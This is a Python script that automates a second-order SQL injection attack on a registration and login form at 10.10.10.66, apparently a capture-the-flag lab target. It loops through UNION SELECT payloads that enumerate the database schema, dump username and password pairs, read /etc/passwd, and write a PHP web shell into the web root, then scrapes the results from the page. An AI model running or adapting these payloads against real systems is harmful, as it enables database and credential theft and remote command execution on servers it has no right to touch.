import requests
from bs4 import BeautifulSoup
import re


sqllst=["test') order by 2#",
"test') UNION SELECT 1,version()#",
"test') UNION SELECT 1,group_concat(schema_name) FROM information_schema.schemata#",
"test') UNION SELECT 1,database()#",
"test') UNION SELECT 1,group_concat(table_name) from information_schema.tables#",
"test') UNION SELECT 1,group_concat(table_name) from information_schema.tables where table_schema='sysadmin'#",
"test') UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_schema='sysadmin'#",
"test') UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name='sysadmin.users'#",
"test') UNION SELECT 1,group_concat(username,0x3a,password) from sysadmin.users#",
"test') UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name='users'#",
"test') UNION SELECT 1,group_concat(username,0x3a,password) from users#",
""""test') UNION SELECT 1,"<?php system($_GET['cmd']); ?>" into outfile "//var//www//html//a.php"#""",
"test') UNION SELECT 1,concat(LOAD_FILE('/etc/passwd'))#"]
for payload in sqllst:
 print " "
 print " "
 print payload
 reg="http://10.10.10.66/register.php"
 r=requests.get(reg)
 c=r.cookies['PHPSESSID']
 #print c
 data={'user':payload,'pass':"a",'register':"Register"}
 #print data
 cookies={'PHPSESSID':c}
 r1=requests.post(url=reg,data=data,cookies=cookies)
 src=BeautifulSoup(r1.content,"html.parser")
 #t=src.findAll(text=re.compile('registered'))
 #print t

 log="http://10.10.10.66/index.php"
 l=requests.get(log)
 cl=l.cookies['PHPSESSID']
 cookies={'PHPSESSID':cl}
 #print cl
 data={'user':payload,'pass':"a",'login':"Login"}
 #print data
 r1=requests.post(url=log,data=data,cookies=cookies)
 src=BeautifulSoup(r1.content,"html.parser")
 #print src.get_text
 if(src.findAll("div",{"class":"notes"})):
  resl=src.findAll("div",{"class":"notes"})
  for j in resl:
   print ""
  #a=src.find("div",{"class":"notes"})
   print j.get_text()
   #print j.get_text()
 else:
  print "not found"
 #print src.get_text
 
 
 
 
 